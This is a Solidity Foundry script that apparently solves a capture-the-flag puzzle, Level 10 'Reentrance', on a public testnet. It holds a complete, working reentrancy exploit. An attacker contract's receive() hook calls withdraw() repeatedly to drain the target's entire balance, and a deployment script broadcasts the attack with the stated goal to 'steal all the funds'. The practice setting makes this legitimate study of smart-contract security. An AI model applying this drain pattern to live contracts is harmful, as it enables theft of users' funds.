// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import "../src/Level10Reentrance.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

// Objective: steal all the funds from the contract.

contract Player {
    Reentrance public reentrance;

    constructor(address _reentrance) public {
        reentrance = Reentrance(payable(_reentrance));
    }

    function attack() external payable {
        require(msg.value > 0, "Must send some ether");
        reentrance.donate{value: msg.value}(address(this));
        reentrance.withdraw(msg.value);
    }

    receive() external payable {
        if (address(reentrance).balance >= msg.value) {
            reentrance.withdraw(msg.value);
        }
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}

contract Level10Solution is Script {
    Reentrance public reentrance =
        Reentrance(0xac79bDe5ba712f9FadCAEbb82F42708B5223a8A6);

    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        Player player = new Player(address(reentrance));
        uint256 initialBalance = address(reentrance).balance;

        console.log("Initial balance of Reentrance contract:", initialBalance);
        console.log(
            "Initial balance of Player contract:",
            address(player).balance
        );

        player.attack{value: initialBalance}();

        console.log(
            "Final balance of Reentrance contract:",
            address(reentrance).balance
        );
        console.log(
            "Final balance of Player contract:",
            address(player).balance
        );

        vm.stopBroadcast();
    }
}

// forge script script/Level10Solution.s.sol:Level10Solution --broadcast -vvvv --rpc-url sepolia --etherscan-api-key "${ETHERSCAN_API_KEY}"
